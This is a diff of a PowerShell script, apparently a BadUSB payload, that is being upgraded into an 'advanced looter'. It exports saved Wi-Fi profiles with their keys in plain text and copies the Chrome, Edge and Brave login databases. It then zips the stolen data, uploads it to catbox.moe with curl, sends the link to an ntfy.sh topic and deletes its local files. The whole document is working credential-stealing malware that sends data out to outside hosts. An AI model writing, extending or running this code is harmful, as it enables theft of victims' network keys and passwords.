@@ -1,50 +1,51 @@
 $topic = "data_stwealer_hideen_"
 
-Write-Host "=== [ BADUSB DEBUG CONSOLE ] ===" -ForegroundColor Cyan
+Write-Host "=== [ ADVANCED LOOTER ] ===" -ForegroundColor Cyan
 
-# 1. Setup Workspace
+# 1. Setup
 $dir = "$env:TEMP\LootBox"
-$zip = "$env:TEMP\package.zip"
-
 if (Test-Path $dir) { Remove-Item -Recurse -Force $dir }
 mkdir $dir | Out-Null
+$zip = "$env:TEMP\package.zip"
 if (Test-Path $zip) { Remove-Item -Force $zip }
 
-# 2. Export WiFi Profiles
-Write-Host "[*] Extracting WiFi Profiles..." -ForegroundColor White
+# 2. Grab WiFi (Plain Text)
+Write-Host "[*] Exporting WiFi..." -ForegroundColor White
 netsh wlan export profile folder=$dir key=clear | Out-Null
 
-$fileCount = (Get-ChildItem $dir).Count
-Write-Host "[+] Found $fileCount profiles." -ForegroundColor Green
+# 3. Grab Browser Data (Encrypted Databases)
+Write-Host "[*] Collecting Browser Credentials..." -ForegroundColor White
+$paths = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
+    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"
+)
 
-# 3. Create ZIP
-Write-Host "[*] Creating ZIP Archive..." -ForegroundColor White
-Add-Type -Assembly "System.IO.Compression.FileSystem"
-[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
-
-# 4. Upload to Catbox (Reliable Stealth Uploader)
-if (Test-Path $zip) {
-    Write-Host "[*] Uploading to Catbox..." -ForegroundColor Yellow
-    
-    # We use curl to send the file to Catbox's API
-    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
-    
-    if ($link -like "http*") {
-        Write-Host "[!] SUCCESS! Link: $link" -ForegroundColor Green
-        
-        # 5. Send to ntfy.sh
-        Write-Host "[*] Sending to ntfy..." -ForegroundColor White
-        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
-        Write-Host "[+] Notification Sent!" -ForegroundColor Green
-    } else {
-        Write-Host "[-] Upload Failed. Response: $link" -ForegroundColor Red
+foreach ($path in $paths) {
+    if (Test-Path $path) {
+        $name = ($path -split '\\')[-3] # Gets 'Chrome' or 'Edge'
+        # Copying with -Force to bypass some read locks
+        Copy-Item $path -Destination "$dir\$name`_LoginData" -Force
+        Write-Host "    [+] Grabbed $name database." -ForegroundColor Green
     }
 }
 
-# 6. Debug Pause
-Write-Host "`n================================" -ForegroundColor Cyan
-Write-Host "DONE. Press ENTER to delete local loot and exit." -ForegroundColor Yellow
-Read-Host
+# 4. Zip everything
+Write-Host "[*] Packaging loot..." -ForegroundColor White
+Add-Type -Assembly "System.IO.Compression.FileSystem"
+[System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
 
-# Cleanup
+# 5. Upload to Catbox
+if (Test-Path $zip) {
+    Write-Host "[*] Uploading..." -ForegroundColor Yellow
+    $link = curl.exe -s -F "reqtype=fileupload" -F "fileToUpload=@$zip" https://catbox.moe/user/api.php
+    
+    if ($link -like "http*") {
+        Write-Host "[!] SUCCESS: $link" -ForegroundColor Green
+        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot (WiFi + PassDB): $link"
+    }
+}
+
+Write-Host "`n=== DEBUG FINISHED ===" -ForegroundColor Cyan
+Read-Host "Press Enter to Clean & Exit"
 Remove-Item -Recurse -Force $dir, $zip
